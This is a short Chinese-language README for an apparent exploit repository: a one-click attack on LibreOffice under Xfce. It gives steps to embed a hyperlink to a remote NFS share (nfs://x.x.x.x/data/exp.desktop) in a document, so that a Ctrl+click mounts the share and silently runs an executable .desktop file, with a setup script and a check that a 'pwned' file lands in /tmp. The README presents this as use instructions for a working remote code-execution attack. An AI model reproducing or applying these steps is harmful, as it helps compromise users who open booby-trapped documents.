# LibreOffice one-click 1day

桌面应用程序打开文件和链接的常用方法是将 URI 传递给操作系统以进行处理。

在不同的操作系统下，其对应的方法也不一样：

- Windows：`ShellExecute*`

- Linux：xdg-open检测桌面环境并调用`gio open`、`gvfs-open`、`gnome-open`、`mate-open`或`exo-openenlightment_open`

- MACOS：`NSWorkspace#openURL()`

当以这样的方式打开用户提供的 URL 而没有进行额外检查时，可能会导致代码执行：

- 通过利用操作系统对特定 URI 的或特殊文件扩展名的处理

- 通过利用第三方应用程序 URL 处理程序中的漏洞

# How to use?

在Xfce环境下，满足两个条件

1、nfs URL 会在没有警告/通知的情况下自动挂载，并允许通过 URL 打开操作进行挂载和执行。

2、当文件位于已挂载的文件共享上并且文件设置了可执行权限时，执行 `.desktop` 文件不会触发警告。

3、当通过 nfs URL 挂载后，打开 `.desktop` 文件会显示有关该文件的未知来源的警告消息。但是，即使用户取消了执行，当目标再次打开相同的 URL 时，文件会被执行并且不会显示进一步的警告。


## Environment Setup

- debian docker 环境

```
bash start.sh
```

## Make malicious document

在文档中插入超链接

```url
nfs://x.x.x.x/data/exp.desktop
```

Ctrl + 点击触发超链接

## Verify

Tested on xubuntu 20.04.4, LibreOffice

![](/img/os.jpg)

If successful, the `pwned` file is written to `/tmp` directory

![](/img/exp.jpg)

# Credits

[docker-nfs-server](https://github.com/ehough/docker-nfs-server)

[Allow arbitrary URLs, expect arbitrary code execution
](https://positive.security/blog/url-open-rce)